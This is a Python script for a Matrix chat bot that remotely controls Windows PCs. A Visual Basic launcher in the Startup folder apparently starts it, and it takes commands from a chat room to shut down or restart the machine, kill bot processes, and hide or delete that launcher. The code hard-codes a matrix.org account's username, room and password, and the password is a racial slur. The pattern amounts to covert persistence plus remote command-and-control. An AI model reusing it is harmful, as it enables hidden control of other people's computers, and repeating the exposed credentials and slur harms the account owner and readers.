#!/usr/bin/env python3
"""
b_s.py - Matrix bot for remote PC control
This file is downloaded and run by bot_starter.vbs
"""

import asyncio
import os
import sys
import time
import threading
import subprocess
import psutil
from datetime import datetime, timezone
import tempfile
from pathlib import Path

# Matrix configuration (will be replaced by bot_starter.vbs)
BOT_NAME = "PC1"
USERNAME = "@devotedcomplicationtog:matrix.org"
PASSWORD = "niggashiman"
ROOM_ID = "!BjVmLMjhVOsGzoUWPb:matrix.org"
HOMESERVER = "https://matrix-client.matrix.org"

# Try to import matrix-nio
try:
    from nio import AsyncClient, MatrixRoom, RoomMessageText, LoginResponse, SyncResponse
except ImportError:
    print("Error: matrix-nio not installed. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "matrix-nio[e2e]"])
    from nio import AsyncClient, MatrixRoom, RoomMessageText, LoginResponse, SyncResponse

# Global variables
client = None
connection_timestamp = None  # This will be in Matrix server time (milliseconds)
temp_dir = os.environ.get('TEMP', tempfile.gettempdir())
lock_file = os.path.join(temp_dir, "matrix_bot_temp", "bot.lock")
running = True

def update_lock_file():
    """Continuously update lock file to indicate bot is running"""
    global running
    
    # Ensure directory exists
    try:
        os.makedirs(os.path.dirname(lock_file), exist_ok=True)
        print(f"Lock file directory created/verified: {os.path.dirname(lock_file)}")
    except Exception as e:
        print(f"Error creating lock file directory: {e}")
    
    while running:
        try:
            with open(lock_file, 'w') as f:
                f.write(str(time.time()))
            print(f"Lock file updated: {lock_file}")
            time.sleep(10)  # Update every 10 seconds
        except Exception as e:
            print(f"Error updating lock file: {e}")
            time.sleep(10)

def terminate_processes():
    """Terminate b_s.py and b_m.py processes"""
    terminated = []
    errors = []
    
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline', [])
                if cmdline and len(cmdline) > 1:
                    # Check if it's a Python process running b_s.py or b_m.py
                    if ('python' in cmdline[0].lower() and 
                        any('b_s.py' in arg or 'b_m.py' in arg for arg in cmdline)):
                        proc.terminate()
                        terminated.append(f"{proc.info['name']} (PID: {proc.info['pid']})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # Wait for processes to terminate
        time.sleep(2)
        
        # Force kill if still running
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                cmdline = proc.info.get('cmdline', [])
                if cmdline and len(cmdline) > 1:
                    if ('python' in cmdline[0].lower() and 
                        any('b_s.py' in arg or 'b_m.py' in arg for arg in cmdline)):
                        proc.kill()
                        terminated.append(f"{proc.info['name']} (PID: {proc.info['pid']}) - force killed")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
                
    except Exception as e:
        errors.append(str(e))
    
    return terminated, errors

def get_startup_vbs_path():
    """Get path to bot_starter.vbs in startup folder"""
    startup_folder = os.path.expandvars(
        r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    )
    return os.path.join(startup_folder, "bot_starter.vbs")

def hide_vbs_file():
    """Hide the bot_starter.vbs file"""
    try:
        vbs_path = get_startup_vbs_path()
        if os.path.exists(vbs_path):
            # Set hidden attribute
            subprocess.run(['attrib', '+H', vbs_path], check=True)
            return True
    except Exception as e:
        print(f"Error hiding VBS file: {e}")
    return False

def delete_vbs_file():
    """Delete the bot_starter.vbs file"""
    try:
        vbs_path = get_startup_vbs_path()
        if os.path.exists(vbs_path):
            # Remove hidden attribute first if it exists
            try:
                subprocess.run(['attrib', '-H', vbs_path], check=False)
            except:
                pass
            os.remove(vbs_path)
            return True
    except Exception as e:
        print(f"Error deleting VBS file: {e}")
    return False

def shutdown_pc():
    """Shutdown the PC"""
    try:
        subprocess.run(['shutdown', '/s', '/t', '5'], check=True)
        return True
    except Exception as e:
        print(f"Error shutting down PC: {e}")
        return False

def restart_pc():
    """Restart the PC"""
    try:
        subprocess.run(['shutdown', '/r', '/t', '5'], check=True)
        return True
    except Exception as e:
        print(f"Error restarting PC: {e}")
        return False

async def establish_connection_timestamp():
    """Establish connection timestamp using Matrix server time"""
    global connection_timestamp
    
    try:
        print("Establishing connection timestamp with Matrix server...")
        
        # Do an initial sync to get server time
        response = await client.sync(timeout=5000)
        
        if isinstance(response, SyncResponse):
            # Get the current server timestamp from the sync response
            # We'll use the next_batch token timestamp or current server time
            
            # Send a dummy message to ourselves to get server timestamp
            try:
                # Send a message that we can identify and get its server timestamp
                temp_message = f"__TIMESTAMP_SYNC__{int(time.time())}"
                await client.room_send(
                    room_id=ROOM_ID,
                    message_type="m.room.message",
                    content={
                        "msgtype": "m.text",
                        "body": temp_message
                    }
                )
                
                # Wait a moment and sync to get the message back with server timestamp
                await asyncio.sleep(1)
                sync_response = await client.sync(timeout=5000)
                
                if isinstance(sync_response, SyncResponse):
                    # Look for our timestamp sync message in the room events
                    room_events = sync_response.rooms.join.get(ROOM_ID)
                    if room_events and room_events.timeline and room_events.timeline.events:
                        for event in reversed(room_events.timeline.events):  # Check newest first
                            if (hasattr(event, 'body') and 
                                isinstance(event.body, str) and 
                                event.body.startswith("__TIMESTAMP_SYNC__")):
                                # Found our sync message, use its server timestamp
                                connection_timestamp = event.server_timestamp
                                print(f"Connection timestamp established: {connection_timestamp} (Matrix server time)")
                                return True
                
            except Exception as e:
                print(f"Error with timestamp sync message method: {e}")
            
            # Fallback: use current time converted to milliseconds
            # This is less accurate but better than nothing
            connection_timestamp = int(time.time() * 1000)
            print(f"Connection timestamp established (fallback): {connection_timestamp}")
            return True
            
    except Exception as e:
        print(f"Error establishing connection timestamp: {e}")
    
    # Final fallback
    connection_timestamp = int(time.time() * 1000)
    print(f"Connection timestamp established (final fallback): {connection_timestamp}")
    return False

async def message_callback(room: MatrixRoom, event: RoomMessageText):
    """Handle incoming messages"""
    global connection_timestamp
    
    # Skip if no connection timestamp established
    if connection_timestamp is None:
        print("No connection timestamp - skipping message")
        return
    
    try:
        # Get message timestamp (already in milliseconds from Matrix server)
        message_timestamp = event.server_timestamp
        
        print(f"Message timestamp: {message_timestamp}, Connection timestamp: {connection_timestamp}")
        
        # Skip our own timestamp sync messages
        if hasattr(event, 'body') and event.body.startswith("__TIMESTAMP_SYNC__"):
            print("Skipping timestamp sync message")
            return
        
        # Only respond to messages sent after connection (both timestamps are in milliseconds)
        if message_timestamp <= connection_timestamp:
            print(f"Ignoring old message (sent before connection): {event.body}")
            return
        
        message = event.body.strip()
        print(f"Processing new message: {message}")
        
        # Process commands
        response = await process_command(message)
        
        if response:
            await client.room_send(
                room_id=room.room_id,
                message_type="m.room.message",
                content={
                    "msgtype": "m.text",
                    "body": response
                }
            )
            
    except Exception as e:
        print(f"Error processing message: {e}")

async def process_command(message):
    """Process bot commands"""
    global running
    
    message = message.strip()
    
    # DEFCON 5 - Terminate processes
    if message == f"DEFCON 5 {BOT_NAME}":
        terminated, errors = terminate_processes()
        if not errors:
            running = False  # Stop this bot
            return f"Success from {BOT_NAME} on DEFCON 5"
        else:
            return f"Error from {BOT_NAME} on DEFCON 5: {'; '.join(errors)}"
    
    # DEFCON 4 - Terminate and hide VBS
    elif message == f"DEFCON 4 {BOT_NAME}":
        terminated, errors = terminate_processes()
        if not errors:
            if hide_vbs_file():
                running = False
                return f"Success from {BOT_NAME} on DEFCON 4"
            else:
                return f"Error from {BOT_NAME} on DEFCON 4: Failed to hide VBS file"
        else:
            return f"Error from {BOT_NAME} on DEFCON 4: {'; '.join(errors)}"
    
    # DEFCON 3 - Terminate and delete VBS
    elif message == f"DEFCON 3 {BOT_NAME}":
        terminated, errors = terminate_processes()
        if not errors:
            if delete_vbs_file():
                running = False
                return f"Success from {BOT_NAME} on DEFCON 3"
            else:
                return f"Error from {BOT_NAME} on DEFCON 3: Failed to delete VBS file"
        else:
            return f"Error from {BOT_NAME} on DEFCON 3: {'; '.join(errors)}"
    
    # DEFCON 2 - All bots terminate and delete
    elif message == "DEFCON 2":
        terminated, errors = terminate_processes()
        if not errors:
            if delete_vbs_file():
                running = False
                # Note: The "DEFCON 2 SUCCESSFUL FOR ALL BOTS!" message would need
                # to be coordinated between all bots - this is complex to implement
                return f"Success from {BOT_NAME} on DEFCON 2"
            else:
                return f"Error from {BOT_NAME} on DEFCON 2: Failed to delete VBS file"
        else:
            return f"Error from {BOT_NAME} on DEFCON 2: {'; '.join(errors)}"
    
    # Online check
    elif message == f"Are you online {BOT_NAME}":
        return f"Yes {BOT_NAME} is online"
    
    # PC Shutdown
    elif message == f"PC Shutdown {BOT_NAME}":
        if shutdown_pc():
            return f"shutdown confirmed for {BOT_NAME}"
        else:
            return f"Error from {BOT_NAME}: Failed to initiate shutdown"
    
    # PC Restart
    elif message == f"PC Restart {BOT_NAME}":
        if restart_pc():
            return f"restart confirmed for {BOT_NAME}"
        else:
            return f"Error from {BOT_NAME}: Failed to initiate restart"
    
    # Unrecognized command - respond with nothing
    return None

async def main():
    """Main bot function"""
    global client, running
    
    print(f"Starting Matrix bot: {BOT_NAME}")
    print(f"Lock file path: {lock_file}")
    
    # Start lock file updater thread FIRST
    lock_thread = threading.Thread(target=update_lock_file, daemon=True)
    lock_thread.start()
    print("Lock file updater thread started")
    
    # Initial lock file creation
    try:
        os.makedirs(os.path.dirname(lock_file), exist_ok=True)
        with open(lock_file, 'w') as f:
            f.write(str(time.time()))
        print(f"Initial lock file created: {lock_file}")
    except Exception as e:
        print(f"Error creating initial lock file: {e}")
    
    # Create Matrix client
    client = AsyncClient(HOMESERVER, USERNAME)
    
    try:
        # Login
        print("Logging in...")
        response = await client.login(PASSWORD)
        
        if not isinstance(response, LoginResponse):
            print(f"Failed to login: {response}")
            return
        
        print(f"Logged in successfully as {USERNAME}")
        
        # Join the room if not already joined
        try:
            await client.join(ROOM_ID)
            print(f"Joined room: {ROOM_ID}")
        except Exception as e:
            print(f"Note: Could not join room (might already be joined): {e}")
        
        # Set up message callback BEFORE establishing timestamp
        client.add_event_callback(message_callback, RoomMessageText)
        
        # Establish connection timestamp using Matrix server time
        await establish_connection_timestamp()
        
        print("Bot is now online and ready!")
        
        # Keep syncing
        while running:
            try:
                await client.sync(timeout=30000)
                await asyncio.sleep(1)
            except Exception as e:
                print(f"Sync error: {e}")
                await asyncio.sleep(5)
                
    except Exception as e:
        print(f"Bot error: {e}")
    finally:
        running = False
        if client:
            await client.close()
        print("Bot stopped")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped by user")
        running = False
    except Exception as e:
        print(f"Fatal error: {e}")
        running = False
